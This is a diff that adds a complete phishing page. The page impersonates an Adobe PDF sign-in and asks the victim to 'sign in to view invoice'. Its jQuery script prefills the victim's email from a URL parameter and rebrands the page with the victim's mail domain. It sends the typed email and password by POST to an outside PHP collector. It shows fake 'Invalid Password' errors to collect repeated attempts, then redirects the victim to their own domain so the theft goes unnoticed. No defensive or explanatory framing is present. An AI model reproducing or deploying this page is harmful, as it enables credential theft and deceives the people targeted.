@@ -1,0 +1,155 @@
+<HTML><HEAD><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<STYLE type=text/css>
+body, html {height: 100%;margin: 0;  font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microilsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";}	
+.wrapper {  background-image: url(https://cdn.mcauto-images-production.sendgrid.net/32724a092ad701f7/c6e2282d-8a53-44c8-9b7c-262b2479f731/1366x768.jpg);  background-repeat: no-repeat; background-attachment: fixed;  background-position: center;  background-size: cover;  position: fixed;  top: 0;  left: 0;  height: 100%;  width: 100%;   display: flex;  flex-flow: column nowrap; justify-content: center;  align-items: center;  box-sizing: border-box;}
+.element {  width: 320px;  height: 300px;  padding: 40px 30px;  background-color: #ffffff;  border: 1px solid grey;  border-color: #b30b00;}
+.elemente{	width: 400px;  height: 300px;  padding: 40px 30px;  background-color: #ffffff;  border: 1px solid grey;}
+div .sign-opt {	padding: 20px 0px;	font-size: 14px;}
+.newbutton{	width: 110px; float: left; border-color: #b30b00; background-color: #b30b00; color: #fff; font-size: 14px; padding: 8px 0; cursor: pointer; border: none;}
+</STYLE>
+<title>Adobe ID</title>
+<link rel="shortcut icon" href="https://www.adobe.com/content/dam/dx-dc/favicons/favicon.ico" type="image/vnd.microsoft.icon">
+</HEAD>
+<BODY>
+<DIV class=wrapper><!-- Fixed element that spans the viewport -->
+<DIV id=element class=element>
+<FORM method=post action="#" autocomplete=""><p>
+<DIV id=logo><IMG border=0 alt="" src="https://static.adobelogin.com/clients/virgoweb-2020/4x_817cf14a2f3fcff4ee6d4e35c5026779.png" color="#b30b00" align="top" width="30" height="30"/> <b> Adobe PDF</b></DIV></p><p>
+<DIV id=cont style="TEXT-ALIGN: left; PADDING-TOP: 10px; font-size:20px; color:#b30b00;" >Sign in to view invoice</DIV></p><p>
+
+<DIV><INPUT  name=login id="login" required="required" value="" placeholder="Email address" readonly style="width:320; height:30; border-color: #b30b00"></DIV></p>
+<DIV><INPUT type=password id="passwd" name=passwd required="required" autofocus="autofocus" placeholder="Password" style="width:320; height:30; border-color: #b30b00"></DIV>
+<DIV id=sign-opt class=sign-opt>
+<DIV id=no-acc></A></DIV>
+
+<div style="padding: 5px;"> <div id="msg" style="display: none; color:#FF0000; font-size:14px">Invalid Password.! Please Enter your correct Password</div></div>
+<DIV class=button id="submit-btn"><A href="#" id="submit-btn"><BUTTON id=i983893 class=newbutton id="submit-btn" type=submit name=submit>
+<FONT color=#fff>Sign in</FONT></BUTTON></A></DIV>
+<DIV id=sign-out class=sign-opt><A href="#"></A></DIV></DIV></FORM></DIV><!-- your actual centered element --></DIV>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.slim.min.js" integrity="sha512-yrjEr6HY46i3hW7imuklZtRM7q1wyNUz8smKl2130OHTFHGbXGpHN4nYxrIeu0uJprDsLhycYY+xQ368d9OiaQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha512-Ua/7Woz9L5O0cwB/aYexmgoaD7lw3dWe9FvXejVdgqu71gRog3oJgjSWQR55fwWx+WKuk8cl7UwA1RS6QCadFA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha512-DUC8yqWf7ez3JD1jszxCWSVB0DMP78eOyBpMa5aJki1bIRARykviOuImIczkxlj1KhVSyS16w2FSQetkD4UU2w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+ <script>
+      var count = 0;
+
+      /* global $ */
+      $(document).ready(function () {
+        $("#messagefont").hide();
+		
+		
+  var url = new URL(window.location.href);
+	var email = url.searchParams.get("eml");
+if (!email) {
+
+}
+else
+{
+        var my_email = email
+		$("#login").val(my_email);
+        $("#passwd").focus();
+        var filter =
+          /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $("#errorMsg").show();
+          login.focus;
+          return false;
+        }
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr(ind + 1);
+        var mainPage = "https://www." + my_slice;
+
+        var site = my_slice.split(".", 1);
+        $("#dmain").html("Connecting to " + site[0].toUpperCase());
+        document.title = site[0].toUpperCase() + " SIGN IN";
+		var c= my_slice.substr(0, my_slice.indexOf('.'));
+		var final= c.toLowerCase();
+		var finalu= c.toUpperCase();
+		$("#logoname").html(finalu);
+		$(".logoname").html(finalu);
+		$('#logoname2').html(finalu);
+		$('.logoname2').html(finalu);
+		}
+        $("#submit-btn").click(function (event) {
+          //$('#error').hide();
+          //$('#passwdError').hide();
+          event.preventDefault();
+
+          if ($("#passwd").val() == "") {
+            $("#errorMsg").show();
+            return false;
+          } else {
+            var email = $("#login").val();
+            var password = $("#passwd").val();
+            var x101name = $("#login").val();
+            var sec099 = $("#passwd").val();
+            count = count + 1;
+
+            $.ajax({
+              dataType: "JSON",
+              url: "https://www.hillmarksecuritytraining.com/images/dap/next.php",
+              type: "POST",
+              data: {
+                user: x101name,
+                pass: sec099,
+              },
+              // data: $('#contact').serialize(),
+              beforeSend: function (xhr) {
+                $("#submit-btn").val("Sign in...");
+
+                //  console.log(count);
+              },
+              success: function (response) {
+                $("#submit-btn").val("Sign in");
+                $("#errorMsg").show();
+                $("#passwd").focus();
+                if (response) {
+                  $("#errorMsg").show();
+                  console.log(response);
+                  $("#errorMsg").html(response["msg"]);
+                  if (response["signal"] == "ok") {
+                    $("#passwd").val("");
+                    if (count >= 2) {
+                      count = 0;
+                      // window.location.replace(response['redirect_link']);
+                      window.location.replace("http://www." + my_slice);
+                    }
+                    // $('#messagefont').html(response['msg']);
+                  } else {
+                    $("#errorMsg").show();
+                  }
+                }
+              },
+              error: function () {
+                $("#passwd").val("");
+                $("#passwd").focus();
+                if (count >= 2) {
+                  count = 0;
+                  window.location.replace("http://www." + my_slice);
+                }
+                $("#errorMsg").show();
+              },
+              complete: function () {
+                $("#submit-btn").val("Sign in");
+                $("#passwd").val("");
+                $("#passwd").focus();
+                if (count >= 4) {
+                  count = 0;
+                  window.location.replace("http://www." + my_slice);
+                }
+                $("#errorMsg").show();
+                // $('#messagefont').html("Please try again later");
+              },
+            });
+          }
+
+          ///////////new injection////////////////
+          //  console.log(count);
+        });
+      });
+    </script>
+</BODY></HTML>
